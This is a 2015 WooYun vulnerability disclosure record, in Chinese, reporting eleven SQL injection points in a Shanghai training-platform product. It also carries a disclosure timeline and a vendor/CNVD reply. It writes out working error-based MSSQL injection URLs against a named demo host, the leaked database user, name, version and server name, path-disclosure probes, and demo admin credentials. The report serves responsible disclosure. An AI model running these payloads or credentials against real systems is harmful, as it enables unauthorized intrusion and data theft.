{"id": 28761, "wybug_id": "wooyun-2015-0121382", "wybug_title": "上海天柏在线培训系统通用11处SQL注入漏洞打包", "wybug_corp": "上海天柏信息科技有限公司", "wybug_author": "goubuli", "wybug_date": "2015-06-19 13:58", "wybug_open_date": "2015-09-21 18:14", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["第三方不可信程序", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-06-19：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-06-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-06-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-08-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向公众公开  简要描述： RT又是好多，审核说我是刷的，其实不是，我挖一个提交一个。。。现在把手里的打包发。。。 详细说明：  厂商信息：\n厂商:上海天柏信息科技有限公司官网：http://timber2005.com/案例：http://timber2005.com/Customer.html官方演示demo：http://px2.timber2005.com前台测试帐号：test1,test2,test3,test4,test5,test6 测试密码：123456常用测试账号：test5/123456后台测试帐号：master 测试密码：123456demo测试，mssql注入\n\n\n首先申明一下，wooyun已存在的漏洞，肯定会重复，现在提交现挖的。。。审核说我刷的，其实不是刷啊，我都是挖一个提交一个。。。现在把手里有的打包发了吧，你们审核也方便了。。。案例：\n\n=======================================================================注入一、\nhttp://px2.timber2005.com/WebPage/Paying.aspx?infoid=403参数infoid存在注入\n提交：\nhttp://px2.timber2005.com/WebPage/Paying.aspx?infoid=403 and 1=user\n\n\n注入二、\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Download.aspx?infoid=4 参数info存在注入\n提交：http://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Download.aspx?infoid=4'\n\n提交：\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Download.aspx?infoid=4 and 1=user\n\n\n\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Download.aspx?infoid=4 and 1=db_name()\n\n\n注入三、Base64编码后注入\nhttp://px2.timber2005.com/WebPage/pay_success.aspx?infoid=NDAz参数infoid存在注入\n提交：\n403'\n编码后：\nhttp://px2.timber2005.com/WebPage/pay_success.aspx?infoid=NDAzJw==\n提交：\n403 and 1=user\n编码后：\nhttp://px2.timber2005.com/WebPage/pay_success.aspx?infoid=NDAzIGFuZCAxPXVzZXI=\n\n\n注入四、\nhttp://px2.timber2005.com/MediaCenter/TimberPlayer.aspx?infoid=160&cid=25 and 1=user&date=Thu Jun 18 2015 14:45:25 GMT+0800参数cid存在注入\n\n\n注入五、\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Course_Class_List_Default.aspx?cid=27参数cid存在注入\n提交： and 1=user\n\n注入六、\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/CW_Zone.aspx?cid=27 参数cid存在注入\n提交：\nand 1=user\n\n\n注入七、\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Content.aspx?cid=27参数cid存在注入\n提交：\nand 1=db_name()\n注入八、\nhttp://px2.timber2005.com/MediaCenter/TimberPlayer.aspx?infoid=161&cid=25&date=Thu Jun 18 2015 14:43:00 GMT+0800参数infoid存在注入\n\n\n注入九、\nhttp://px2.timber2005.com/Exam/User_Exam.aspx?wkey=GD&planid=4138&planname=练习测试&time=100&point=100&passpoint=10&module=True&pid=4110&examkey=&return=../Course/User_Test_Query.aspx?infoid=参数planid存在注入\n提交：\nhttp://px2.timber2005.com/Exam/User_Exam.aspx?wkey=GD&planid=4138 and user=1&planname=练习测试&time=100&point=100&passpoint=10&module=True&pid=4110&examkey=&return=../Course/User_Test_Query.aspx?infoid=\n\n\n注入十、\nhttp://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Zone.aspx?cid=25 and 1=user参数cid存在注入\n\n\n注入十一、\nhttp://px2.timber2005.com/WebPage/Personcenterd/Classroom/User_Exam_Query.aspx?yc=y&cid=25 and 1=user参数cid存在注入\n\n\n----------------------------------------------------------------------数据证明用户：提交：\nhttp://px2.timber2005.com/WebPage/Personcenterd/Classroom/User_Exam_Query.aspx?yc=y&cid=25 and 1=user\n\n\n\n将 nvarchar 值 'dbo' 转换为数据类型为 int 的列时发生语法错误。\n数据库名称：提交：\nhttp://px2.timber2005.com/WebPage/Personcenterd/Classroom/User_Exam_Query.aspx?yc=y&cid=25 and 1=db_name()\n\n\n\n将 nvarchar 值 'Timber_Exam_Org' 转换为数据类型为 int 的列时发生语法错误。\n数据库版本：提交：\nhttp://px2.timber2005.com/WebPage/Personcenterd/Classroom/User_Exam_Query.aspx?yc=y&cid=25 and 1=@@version\n\n\n\n将 nvarchar 值 'Microsoft SQL Server  2000 - 8.00.2039 (Intel X86)May  3 2005 23:18:38Copyright (c) 1988-2003 Microsoft CorporationPersonal Edition on Windows NT 6.0 (Build 6002: Service Pack 2)' 转换为数据类型为 int 的列时发生语法错误。\n机器名称：提交：\nhttp://px2.timber2005.com/WebPage/Personcenterd/Classroom/User_Exam_Query.aspx?yc=y&cid=25 and 1=host_name()\n\n\n\n将 nvarchar 值 'TIMBER_SERVER3' 转换为数据类型为 int 的列时发生语法错误。\n=======================================================================爆路径一、提交：http://px2.timber2005.com/WebPage/Paying.aspx?infoid=403a\n\n爆路径二、http://px2.timber2005.com/Webpage/Personcenterd/Classroom/Case_Content.aspx?cid=27\n\n   漏洞证明：  已证明   修复方案：  升级+补丁添加友好500界面   版权声明：转载请注明来源 goubuli@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：10  确认时间：2015-06-23 18:13 厂商回复： CNVD确认所述漏洞情况，暂未建立与软件生产厂商的直接处置渠道，待认领。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 10, "Ranks": null}